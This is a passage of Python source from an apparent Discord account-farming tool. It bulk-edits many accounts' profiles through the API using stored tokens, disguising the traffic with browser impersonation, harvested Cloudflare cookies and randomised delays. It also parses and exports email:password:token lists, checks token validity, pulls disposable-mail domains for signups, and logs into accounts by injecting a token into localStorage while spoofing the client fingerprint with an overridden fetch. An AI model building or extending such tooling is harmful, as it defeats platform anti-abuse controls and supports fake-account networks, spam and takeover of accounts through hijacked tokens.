                        if _USE_CFFI:
                            _harvest_cf_cookies(session)
                        else:
                            session.headers.update({'User-Agent': _USER_AGENT})
                            try:
                                session.get("https://discord.com/", timeout=8)
                            except Exception:
                                pass
                        _human_delay(0.4, 0.9)

                        valid, err_msg = _warm_session(session, token)
                        if not valid:
                            self.log(f"{MskColor.PRIMARY}[{MskColor.RESET}{i+1}/{len(tokens)}{MskColor.PRIMARY}]{MskColor.RESET} "
                                     f"{MskColor.RED}{err_msg}{MskColor.RESET} {token[:10]}***", 'error')
                            self._humanizer_stats['failed'] += 1
                            self._humanizer_stats['current'] = i + 1
                            continue

                        _gw_session = None
                        try:
                            from .Helper.huminazer import DiscordGatewaySession as _GWSession
                            from .Helper.huminazer import _humanizer_fetch_build_number as _fetch_bn
                            _bn = _fetch_bn()
                            _gw_session = _GWSession(token, _bn)
                            _gw_session.connect(timeout=15)
                        except Exception:
                            _gw_session = None

                        _human_delay(0.5, 1.2)

                        profile_payload = {}
                        if do_display:
                            name_val = random.choice(name_lines)[:32] if name_lines else ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(6, 12)))
                            profile_payload['global_name'] = name_val
                        if do_bio and bio_lines:
                            profile_payload['bio'] = random.choice(bio_lines)[:190]
                        if do_pronouns:
                            profile_payload['pronouns'] = random.choice(pronouns_options)

                        if profile_payload:
                            try:
                                _human_delay(0.6, 1.2)
                                profile_only = {k: v for k, v in profile_payload.items() if k != 'global_name'}
                                if profile_only:
                                    r = session.patch('https://discord.com/api/v9/users/@me/profile',
                                                      json=profile_only, headers=_build_headers(token), timeout=10)
                                    if r.status_code == 429:
                                        _handle_rate_limit(r)
                                        r = session.patch('https://discord.com/api/v9/users/@me/profile',
                                                          json=profile_only, headers=_build_headers(token), timeout=10)
                                    if r.status_code in (200, 204):
                                        if 'bio' in profile_only:
                                            succeeded.append('bio')
                                        if 'pronouns' in profile_only:
                                            succeeded.append('pronouns')
                                    else:
                                        try:
                                            err_detail = r.text[:120]
                                        except Exception:
                                            err_detail = str(r.status_code)
                                        if 'bio' in profile_only:
                                            failed_parts.append('bio')
                                            failed_details['bio'] = f"{r.status_code} {err_detail}"
                                        if 'pronouns' in profile_only:
                                            failed_parts.append('pronouns')
                                            failed_details['pronouns'] = f"{r.status_code} {err_detail}"

                                if 'global_name' in profile_payload:
                                    _human_delay(0.5, 1.0)
                                    rn = session.patch('https://discord.com/api/v9/users/@me',
                                                       json={'global_name': profile_payload['global_name']},
                                                       headers=_build_headers(token), timeout=10)
                                    if rn.status_code == 429:
                                        _handle_rate_limit(rn)
                                        rn = session.patch('https://discord.com/api/v9/users/@me',
                                                           json={'global_name': profile_payload['global_name']},
                                                           headers=_build_headers(token), timeout=10)
                                    if rn.status_code in (200, 204):
                                        succeeded.append('name')
                                    else:
                                        try:
                                            err_body = rn.text[:120]
                                        except Exception:
                                            err_body = str(rn.status_code)
                                        failed_parts.append('name')
                                        failed_details['name'] = f"{rn.status_code} {err_body}"
                            except Exception as e:
                                _exc_msg = str(e)[:80]
                                if 'bio' in profile_payload and 'bio' not in succeeded:
                                    failed_parts.append('bio')
                                    failed_details['bio'] = _exc_msg
                                if 'pronouns' in profile_payload and 'pronouns' not in succeeded:
                                    failed_parts.append('pronouns')
                                    failed_details['pronouns'] = _exc_msg
                                if 'global_name' in profile_payload and 'name' not in succeeded:
                                    failed_parts.append('name')
                                    failed_details['name'] = _exc_msg

                        if do_avatar and avatar_files:
                            try:
                                _human_delay(1.0, 2.0)
                                pool = [f for f in getattr(self, '_selected_avatars', []) if f in avatar_files] or avatar_files
                                av_file = os.path.join(avatars_dir, random.choice(pool))
                                if os.path.exists(av_file):
                                    from PIL import Image as _PILImg
                                    import io as _io
                                    with _PILImg.open(av_file) as img:
                                        img = img.convert('RGB')
                                        img = img.resize((256, 256), _PILImg.LANCZOS)
                                        buf = _io.BytesIO()
                                        img.save(buf, format='JPEG', quality=85)
                                        raw = buf.getvalue()
                                        q = 70
                                        while len(raw) > 2_000_000 and q > 20:
                                            buf = _io.BytesIO()
                                            img.save(buf, format='JPEG', quality=q)
                                            raw = buf.getvalue()
                                            q -= 10
                                    av_b64 = base64.b64encode(raw).decode()
                                    _human_delay(0.3, 0.6)
                                    def _avatar_patch():
                                        payload = {'avatar': f'data:image/jpeg;base64,{av_b64}'}
                                        if _USE_CFFI:
                                            with cffi_requests.Session(impersonate="chrome131") as fresh_session:
                                                return fresh_session.patch('https://discord.com/api/v9/users/@me',
                                                                           json=payload,
                                                                           headers=_build_headers(token), timeout=25)
                                        return session.patch('https://discord.com/api/v9/users/@me',
                                                             json=payload,
                                                             headers=_build_headers(token), timeout=25)

                                    r2 = _avatar_patch()
                                    if r2.status_code == 429:
                                        _handle_rate_limit(r2)
                                        r2 = _avatar_patch()

                                    if r2.status_code == 403:
                                        try:
                                            _msg = r2.json().get('message', '')
                                            if 'verify your account' in _msg.lower():
                                                failed_parts.append('avatar')
                                                failed_details['avatar'] = f"403 Token locked"
                                                r2 = None
                                        except Exception:
                                            pass
                                    if r2 is not None:
                                        if r2.status_code in (200, 204):
                                            succeeded.append('avatar')
                                        else:
                                            try:
                                                err_body = r2.text[:120]
                                            except Exception:
                                                err_body = str(r2.status_code)
                                            failed_parts.append('avatar')
                                            failed_details['avatar'] = f"{r2.status_code} {err_body}"
                            except Exception as _av_err:
                                failed_parts.append('avatar')
                                failed_details['avatar'] = str(_av_err)[:80]

                        if do_hype:
                            try:
                                _human_delay(0.5, 1.5)
                                _hype_id = random.choice(hype_ids)
                                r3 = session.post('https://discord.com/api/v9/hypesquad/online',
                                                  json={'house_id': _hype_id},
                                                  headers=_build_headers(token), timeout=10)
                                if r3.status_code == 429:
                                    _handle_rate_limit(r3)
                                    r3 = session.post('https://discord.com/api/v9/hypesquad/online',
                                                      json={'house_id': _hype_id},
                                                      headers=_build_headers(token), timeout=10)
                                if r3.status_code in (200, 204):
                                    succeeded.append('hypesquad')
                                else:
                                    try:
                                        _hype_err = r3.text[:80]
                                    except Exception:
                                        _hype_err = str(r3.status_code)
                                    failed_parts.append('hypesquad')
                                    failed_details['hypesquad'] = f"{r3.status_code} {_hype_err}"
                            except Exception as _hype_ex:
                                failed_parts.append('hypesquad')
                                failed_details['hypesquad'] = str(_hype_ex)[:60]

                except Exception as err:
                    failed_parts.append(f'error')
                    self.log(f"{MskColor.PRIMARY}[{MskColor.RESET}{i+1}/{len(tokens)}{MskColor.PRIMARY}]{MskColor.RESET} "
                             f"{MskColor.RED}Error: {str(err)[:60]}{MskColor.RESET}", 'error')
                finally:
                    if _gw_session is not None:
                        try:
                            _gw_session.close()
                        except Exception:
                            pass

                is_failed = len(failed_parts) > 0 and len(succeeded) == 0
                self._humanizer_stats['failed' if is_failed else 'success'] += 1
                self._humanizer_stats['current'] = i + 1

                _prefix = (f"{MskColor.PRIMARY}[{MskColor.RESET}{i+1}/{len(tokens)}{MskColor.PRIMARY}]{MskColor.RESET} "
                           f"{MskColor.DIM}{token[:10]}***{MskColor.RESET}")

                _field_checks = [
                    ('avatar',    do_avatar    and bool(avatar_files)),
                    ('name',      do_display),
                    ('bio',       do_bio),
                    ('pronouns',  do_pronouns),
                    ('hypesquad', do_hype),
                ]
                for _field, _enabled in _field_checks:
                    if not _enabled:
                        continue
                    if _field in succeeded:
                        self.log(f"{_prefix} {MskColor.GREEN}{_field}: humanized{MskColor.RESET}", 'info')
                    elif _field == 'bio' and do_bio and not bio_lines:
                        self.log(f"{_prefix} {MskColor.YELLOW}bio: skipped (bio.txt not found){MskColor.RESET}", 'warning')
                    else:
                        _raw_err = failed_details.get(_field, '')
                        _err_suffix = f" ({_raw_err})" if _raw_err else ""
                        self.log(f"{_prefix} {MskColor.RED}{_field}: failed{_err_suffix}{MskColor.RESET}", 'warning')

                if succeeded:
                    with open(output_path, 'a', encoding='utf-8') as outf:
                        outf.write(token_line + '\n')

                _human_delay(1.5, 3.0)

            self._humanizer_running = False
            from .MskColors.color import MskColor as _MC
            _P = _MC.PRIMARY; _D = _MC.DIM; _R = _MC.RESET
            s = self._humanizer_stats
            self.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {_MC.GREEN}Humanizer done! "
                     f"Success: {s['success']}, Failed: {s['failed']}, Skipped: {s['skipped']}{_R}", 'success')

        except Exception as e:
            self._humanizer_running = False
            from .MskColors.color import MskColor as _MC
            _P = _MC.PRIMARY; _D = _MC.DIM; _R = _MC.RESET
            self.log(f"{_P}[{_R}{_D}Msk{_R}{_P}]{_R} {_MC.RED}Humanizer error: {str(e)}{_R}", 'error')


    def get_avatars(self) -> Dict:
        avatars_dir = get_resource_path("data/input/profiles/avatars")
        avatars = []

        if not os.path.exists(avatars_dir):
            return {"avatars": []}

        for filename in sorted(os.listdir(avatars_dir)):
            if filename.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                filepath = os.path.join(avatars_dir, filename)
                try:
                    with open(filepath, 'rb') as f:
                        data = base64.b64encode(f.read()).decode()
                    ext = filename.rsplit('.', 1)[-1].lower()
                    mime = 'image/jpeg' if ext in ('jpg', 'jpeg') else f'image/{ext}'
                    avatars.append({
                        "filename": filename,
                        "data": f"data:{mime};base64,{data}"
                    })
                except:
                    pass

        return {"avatars": avatars}

    def upload_avatar(self, filename: str, base64_data: str) -> Dict:
        avatars_dir = get_resource_path("data/input/profiles/avatars")
        os.makedirs(avatars_dir, exist_ok=True)

        try:
            if ',' in base64_data:
                base64_data = base64_data.split(',', 1)[1]
            img_data = base64.b64decode(base64_data)
            filepath = os.path.join(avatars_dir, filename)
            with open(filepath, 'wb') as f:
                f.write(img_data)
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def save_selected_avatars(self, filenames: List[str]) -> Dict:
        self._selected_avatars = filenames
        return {"success": True}

    def open_output_file(self, filename: str) -> Dict:
        filepath = get_resource_path(f"data/output/{filename}")
        try:
            if os.path.exists(filepath):
                if sys.platform == 'win32':
                    os.startfile(filepath)
                return {"success": True}
            return {"success": False, "error": "File not found"}
        except Exception as e:
            return {"success": False, "error": str(e)}




    def _get_domains_cache_path(self) -> str:
        """Get path to the cached domains file."""
        from .Utils.utils import get_base_path
        return os.path.join(get_base_path(), "data", "input", "cybertemp_domains.txt")

    def _load_cached_domains(self) -> list:
        """Load domains from the cache .txt file, falling back to known DISCORD_DOMAINS."""
        cache_path = self._get_domains_cache_path()
        try:
            if os.path.exists(cache_path):
                domains = [line.strip() for line in open(cache_path, "r", encoding="utf-8") if line.strip()]
                if domains:
                    return domains
        except Exception:
            pass
        return [
            "rainga.ng", "diddyricky.fr", "lonard-os.com", "diddyricky.store",
            "diddyricky.com", "soniot.fr", "saturn.monster", "soniot.info",
            "diddyricky.info", "soniot.online", "soniot.store"
        ]

    def _save_cached_domains(self, domains: list):
        """Save domains to the cache .txt file."""
        cache_path = self._get_domains_cache_path()
        try:
            os.makedirs(os.path.dirname(cache_path), exist_ok=True)
            with open(cache_path, "w", encoding="utf-8") as f:
                for d in sorted(domains):
                    f.write(d + "\n")
        except Exception:
            pass

    def check_cybertemp_domains(self) -> Dict:
        """Fetch available CyberTemp domains, cache them, and tag as new/known."""
        try:
            from .Helper.mail import MskMailApi
            from .Utils.utils import Utils

            api_key = self._settings.get("email_providers", {}).get("cybertemp", {}).get("api_key", "")
            if not api_key:
                api_key = self._settings.get("cybertemp_api_key", "")

            mail_api = MskMailApi(api_key=api_key if api_key else None)
            domains = mail_api.get_domains(domain_type="discord")

            if not domains:
                cached = self._load_cached_domains()
                if cached:
                    known_domains = set(Utils.DISCORD_DOMAINS)
                    result = []
                    for d in cached:
                        tag = "known" if d in known_domains else "new"
                        result.append({"domain": d, "tag": tag})
                    result.sort(key=lambda x: (0 if x["tag"] == "new" else 1, x["domain"]))
                    return {"success": True, "domains": result, "message": f"Loaded {len(result)} cached domains (API unavailable)", "cached": True}
                return {"success": False, "domains": [], "message": "No domains found or API error"}

            self._save_cached_domains(domains)

            known_domains = set(Utils.DISCORD_DOMAINS)
            result = []
            for d in domains:
                tag = "known" if d in known_domains else "new"
                result.append({"domain": d, "tag": tag})

            result.sort(key=lambda x: (0 if x["tag"] == "new" else 1, x["domain"]))

            return {"success": True, "domains": result, "message": f"Found {len(result)} domains", "cached": False}
        except Exception as e:
            cached = self._load_cached_domains()
            if cached:
                try:
                    from .Utils.utils import Utils
                    known_domains = set(Utils.DISCORD_DOMAINS)
                except Exception:
                    known_domains = set()
                result = [{"domain": d, "tag": "known" if d in known_domains else "new"} for d in cached]
                result.sort(key=lambda x: (0 if x["tag"] == "new" else 1, x["domain"]))
                return {"success": True, "domains": result, "message": f"Loaded {len(result)} cached domains (error: {str(e)[:40]})", "cached": True}
            return {"success": False, "domains": [], "message": f"Error: {str(e)}"}

    def check_duckmail_domains(self) -> Dict:
        """Fetch available DuckMail domains."""
        try:
            from .Helper.mail import DuckMailApi
            api_key = self._settings.get("email_providers", {}).get("duckmail", {}).get("api_key", "")
            
            mail_api = DuckMailApi(api_key=api_key if api_key else None)
            domains = mail_api.get_domains()
            
            if not domains:
                return {"success": False, "domains": [], "message": "No domains found or API error"}
                
            result = [{"domain": d, "tag": "new"} for d in domains]
            result.sort(key=lambda x: x["domain"])
            
            return {"success": True, "domains": result, "message": f"Found {len(result)} domains", "cached": False}
        except Exception as e:
            return {"success": False, "domains": [], "message": f"Error: {str(e)}"}

    def close(self):
        try:
            import webview
            for window in webview.windows:
                window.destroy()
        except:
            pass

    def minimize(self):
        try:
            import webview
            for window in webview.windows:
                window.minimize()
        except:
            pass

    def _getchecksum(self) -> str:
        try:
            md5_hash = hashlib.md5()
            with open(sys.argv[0], "rb") as f:
                md5_hash.update(f.read())
            return md5_hash.hexdigest()
        except:
            return "unknown"

    def check_splitter_file(self) -> Dict:
        """Check if tokenSplited.txt already exists and has content."""
        try:
            output_path = get_resource_path(os.path.join("data", "output", "tokenSplited.txt"))
            if os.path.exists(output_path):
                with open(output_path, "r", encoding="utf-8") as f:
                    lines = [l.strip() for l in f.readlines() if l.strip()]
                return {"exists": True, "count": len(lines), "path": output_path}
            return {"exists": False, "count": 0, "path": output_path}
        except Exception as e:
            return {"exists": False, "count": 0, "path": "", "error": str(e)}

    def split_tokens(self, raw_lines: List[str], clean_old: bool) -> Dict:
        """
        Extract tokens from mail:password:token (or just token) lines.
        Deduplicates. Appends or overwrites depending on clean_old.
        Returns stats dict.
        """
        try:
            output_dir = get_resource_path(os.path.join("data", "output"))
            os.makedirs(output_dir, exist_ok=True)
            output_path = os.path.join(output_dir, "tokenSplited.txt")

            parsed = []
            skipped = 0
            for line in raw_lines:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(":")
                if len(parts) >= 3:
                    token = parts[-1].strip()
                elif len(parts) == 1:
                    token = parts[0].strip()
                else:
                    skipped += 1
                    continue
                if token:
                    parsed.append(token)
                else:
                    skipped += 1

            existing = set()
            if not clean_old and os.path.exists(output_path):
                with open(output_path, "r", encoding="utf-8") as f:
                    existing = set(l.strip() for l in f if l.strip())

            seen = set(existing)
            unique_new = []
            dupes = 0
            for token in parsed:
                if token in seen:
                    dupes += 1
                else:
                    seen.add(token)
                    unique_new.append(token)

            mode = "w" if clean_old else "a"
            with open(output_path, mode, encoding="utf-8") as f:
                for token in unique_new:
                    f.write(token + "\n")

            return {
                "success": True,
                "saved": len(unique_new),
                "duplicates": dupes,
                "skipped": skipped,
                "total_in_file": len(existing) + len(unique_new) if not clean_old else len(unique_new),
                "path": output_path
            }
        except Exception as e:
            return {"success": False, "error": str(e), "saved": 0, "duplicates": 0, "skipped": 0}


    def clean_all_txt_files(self) -> Dict:
        """Delete all .txt files in the data/output directory."""
        try:
            from .Utils.utils import get_resource_path
            output_dir = get_resource_path("data/output")
            if not os.path.isdir(output_dir):
                return {"success": True, "deleted": 0}
            
            deleted = 0
            errors = []
            for fname in os.listdir(output_dir):
                if fname.endswith(".txt"):
                    fpath = os.path.join(output_dir, fname)
                    try:
                        os.remove(fpath)
                        deleted += 1
                    except Exception as e:
                        errors.append(f"{fname}: {str(e)}")
            
            if errors:
                return {"success": True, "deleted": deleted, "errors": errors}
            return {"success": True, "deleted": deleted}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def remove_dead_tokens(self, filename: str, lines_to_keep: List[str]) -> Dict:
        """Overwrite the token file with only the valid lines."""
        try:
            from .Utils.utils import get_resource_path
            output_dir = get_resource_path("data/output")
            fpath = os.path.join(output_dir, filename)
            
            if not os.path.exists(fpath):
                return {"success": False, "error": "File not found"}
                
            with open(fpath, "w", encoding="utf-8") as f:
                for line in lines_to_keep:
                    f.write(f"{line.strip()}\n")
            
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}


    def _get_tm_cache_path(self) -> str:
        from .Utils.utils import get_resource_path
        return get_resource_path("data/credentials/tm_cache.json")

    def _load_tm_cache(self) -> dict:
        path = self._get_tm_cache_path()
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    return json.load(f)
            except:
                pass
        return {}

    def _save_tm_cache(self, cache: dict):
        path = self._get_tm_cache_path()
        os.makedirs(os.path.dirname(path), exist_ok=True)
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(cache, f)
        except:
            pass

    def _cleanup_tm_cache(self) -> None:
        try:
            from .Utils.utils import get_resource_path
            from .WorkFlow.token_checker import extract_token
            output_dir = get_resource_path("data/output")
            if not os.path.isdir(output_dir):
                return
            all_known_tokens = set()
            for fname in os.listdir(output_dir):
                if fname.endswith(".txt"):
                    fpath = os.path.join(output_dir, fname)
                    try:
                        with open(fpath, "r", encoding="utf-8") as f:
                            for line in f:
                                line = line.strip()
                                if line:
                                    token = extract_token(line)
                                    if token:
                                        all_known_tokens.add(token)
                    except:
                        pass
            cache = self._load_tm_cache()
            keys_to_remove = [k for k in cache.keys() if k not in all_known_tokens]
            if keys_to_remove:
                for k in keys_to_remove:
                    del cache[k]
                self._save_tm_cache(cache)
        except:
            pass

    def list_token_files(self) -> Dict:
        """List all .txt files in the data/output directory for the Token Manager."""
        try:
            self._cleanup_tm_cache()
            from .Utils.utils import get_resource_path
            output_dir = get_resource_path("data/output")
            if not os.path.isdir(output_dir):
                return {"success": True, "files": []}
            
            files = []
            for fname in os.listdir(output_dir):
                if fname.endswith(".txt"):
                    fpath = os.path.join(output_dir, fname)
                    try:
                        with open(fpath, "r", encoding="utf-8") as f:
                            lines = [l.strip() for l in f if l.strip()]
                        files.append({
                            "name": fname,
                            "path": fpath,
                            "count": len(lines),
                            "modified": os.path.getmtime(fpath)
                        })
                    except Exception:
                        files.append({"name": fname, "path": fpath, "count": 0, "modified": 0})
            
            files.sort(key=lambda x: x["modified"], reverse=True)
            return {"success": True, "files": files}
        except Exception as e:
            return {"success": False, "error": str(e), "files": []}

    def load_token_file(self, filename: str) -> Dict:
        """Load and parse a token file into structured account data."""
        try:
            from .Utils.utils import get_resource_path
            fpath = get_resource_path(f"data/output/{filename}")
            if not os.path.exists(fpath):
                return {"success": False, "error": "File not found", "accounts": []}
            
            accounts = []
            from .WorkFlow.token_checker import extract_token
            with open(fpath, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    
                    token = extract_token(line)
                    parts = line.split(":")
                    
                    email = ""
                    password = ""
                    username = "unknown"
                    
                    for part in parts:
                        part = part.strip()
                        if "@" in part and "." in part and len(part) < 40 and part != token:
                            email = part
                            username = email.split("@")[0][:16]
                            break
                    
                    if username == "unknown":
                        for part in parts:
                            part = part.strip()
                            if part != token and "@" not in part and len(part) >= 4 and len(part) < 25:
                                username = part
                                break
                    
                    accounts.append({
                        "email": email,
                        "password": password,
                        "token": token,
                        "username": username,
                        "raw": line
                    })
            
            cache = self._load_tm_cache()
            for acc in accounts:
                t = acc["token"]
                if t in cache:
                    c = cache[t]
                    if c.get("username"):
                        acc["username"] = c["username"]
                    if c.get("avatarUrl"):
                        acc["avatar_url"] = c["avatarUrl"]
                    if c.get("hypesquad") is not None:
                        acc["hypesquad"] = c["hypesquad"]
                    if c.get("status"):
                        acc["status"] = c["status"]

            return {"success": True, "accounts": accounts, "total": len(accounts)}
        except Exception as e:
            return {"success": False, "error": str(e), "accounts": []}



    def export_tokens(self, filename: str, format_type: str = "raw") -> Dict:
        """Export tokens from a file in the specified format."""
        try:
            from .Utils.utils import get_resource_path
            fpath = get_resource_path(f"data/output/{filename}")
            if not os.path.exists(fpath):
                return {"success": False, "error": "File not found"}
            
            with open(fpath, "r", encoding="utf-8") as f:
                lines = [l.strip() for l in f if l.strip()]
            
            from .WorkFlow.token_checker import extract_token
            if format_type == "token_only":
                exported = []
                for line in lines:
                    token = extract_token(line)
                    if token:
                        exported.append(token)
                    else:
                        exported.append(line)
                return {"success": True, "data": "\n".join(exported), "count": len(exported)}
            elif format_type == "email_pass":
                exported = []
                for line in lines:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        exported.append(f"{parts[0]}:{parts[1]}")
                return {"success": True, "data": "\n".join(exported), "count": len(exported)}
            else:
                return {"success": True, "data": "\n".join(lines), "count": len(lines)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def check_single_token(self, token: str) -> Dict:
        """Check a single token and return status + Discord user info (username, avatar)."""
        try:
            from .WorkFlow.token_checker import check_token_safe
            token = (token or "").strip()
            r = check_token_safe(token)

            if not r.get("valid"):
                status = "invalid"
            elif r.get("locked") or r.get("email_required") or r.get("phone_required"):
                status = "locked"
            else:
                status = "valid"

            username    = r.get("username") or ""
            global_name = r.get("global_name") or ""
            name_to_use = global_name if global_name else username
            
            hypesquad = r.get("hypesquad") or ""
            
            user_id    = r.get("id") or ""
            avatar_hash = r.get("avatar_hash") or ""
            avatar_url = ""
            
            if user_id and avatar_hash:
                ext = "gif" if avatar_hash.startswith("a_") else "png"
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.{ext}?size=64"

            # Save check to cache
            cache = self._load_tm_cache()
            cache[token] = {
                "status": status,
                "username": name_to_use,
                "avatarUrl": avatar_url,
                "hypesquad": hypesquad
            }
            self._save_tm_cache(cache)

            return {
                "success":    True,
                "status":     status,
                "username":   name_to_use,
                "user_id":    user_id,
                "avatar_url": avatar_url,
                "hypesquad":  hypesquad
            }
        except Exception as e:
            return {"success": False, "error": str(e), "status": "invalid"}








    def login_with_token(self, token_or_raw: str) -> Dict:
        """Open a browser and login to Discord with the given token and inject custom fingerprint."""
        try:
            from .WorkFlow.token_checker import extract_token
            parts = token_or_raw.strip().split(":")
            token = extract_token(token_or_raw) or token_or_raw
            fingerprint = ""
            
            # Check if last part is fingerprint (longer than 32 chars and no dots, or digits)
            if len(parts) >= 4:
                last_part = parts[-1].strip()
                if (len(last_part) >= 32 and "." not in last_part) or last_part.isdigit():
                    fingerprint = last_part
            
            import threading
            def launch_browser():
                from DrissionPage import ChromiumOptions, ChromiumPage

                co = ChromiumOptions()
                brave_paths = [
                    os.path.expandvars(r"%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
                    os.path.expandvars(r"%PROGRAMFILES%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
                    os.path.expandvars(r"%PROGRAMFILES(X86)%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"),
                ]
                for p in brave_paths:
                    if os.path.exists(p):
                        co.set_browser_path(p)
                        break
                        
                co.auto_port()
                co.incognito(True)
                page = ChromiumPage(co)
                
                if fingerprint:
                    import json
                    fp_escaped = json.dumps(fingerprint)
                    fp_inject_js = f"""(function(){{
                        var _msk_cfp = {fp_escaped};
                        var _origFetch = window.fetch;
                        window.fetch = function(input, init) {{
                            var url = (typeof input === 'string') ? input : (input && input.url ? input.url : '');
                            if (url && url.indexOf('/api/') !== -1 && url.indexOf('/experiments') !== -1) {{
                                var body = JSON.stringify({{fingerprint: _msk_cfp, assignments: [], guild_experiments: []}});
                                return Promise.resolve(new Response(body, {{status: 200, headers: {{'Content-Type': 'application/json'}}}}));
                            }}
                            return _origFetch.call(this, input, init);
                        }};
                    }})();"""
                    try:
                        page.run_cdp('Page.addScriptToEvaluateOnNewDocument', source=fp_inject_js)
                    except Exception:
                        pass
                
                page.get('https://discord.com/login')
                page.wait.load_start()
                inj_script = f"""
                function injectToken(token) {{
                    setInterval(() => {{
                        document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = `"${{token}}"`;
                    }}, 50);
                    setTimeout(() => {{
                        location.reload();
                    }}, 2500);
                }}
                injectToken('{token}');
                """
                page.run_js(inj_script)

            threading.Thread(target=launch_browser, daemon=True).start()
            return {"success": True, "method": "drissionpage"}
        except Exception as e:
            return {"success": False, "error": str(e)}

